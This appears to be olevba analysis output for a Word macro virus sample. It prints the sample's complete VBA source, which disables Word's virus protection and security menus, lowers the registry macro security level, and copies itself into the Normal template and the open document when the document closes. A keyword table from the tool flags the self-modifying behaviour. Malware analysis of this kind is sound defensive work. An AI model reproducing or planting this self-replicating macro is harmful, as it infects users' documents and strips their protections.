olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Fs.v
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO Sap.cls 
in file: Virus.MSWord.Fs.v - OLE stream: 'Macros/VBA/Sap'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Copyright (C) 1998 by FlyShadow ~^^~ - Sap
Private Sub Document_Close()
On Error Resume Next
Options.VirusProtection = 0
Options.SaveNormalPrompt = 0
Options.ConfirmConversions = 0
CommandBars("Tools").Controls("Macro").Enabled = 0
CommandBars("Macro").Controls("Security...").Enabled = 0
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
Set α = New DataObject
Set ν = ActiveDocument.VBProject.VBComponents(1)
Set υ = NormalTemplate.VBProject.VBComponents(1)
α.SetText Sap.VBProject.VBComponents(1).CodeModule.Lines(1, Sap.VBProject.VBComponents(1).CodeModule.CountOfLines)
If Not ν.Name = "Sap" Then ν.Name = "Sap": Set ν = ν.CodeModule: ν.DeleteLines 1, ν.CountOfLines: ν.InsertLines 1, α.GetText
If Not υ.Name = "Sap" Then υ.Name = "Sap": Set υ = υ.CodeModule: υ.DeleteLines 1, υ.CountOfLines: υ.InsertLines 1, α.GetText
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
+----------+--------------------+---------------------------------------------+

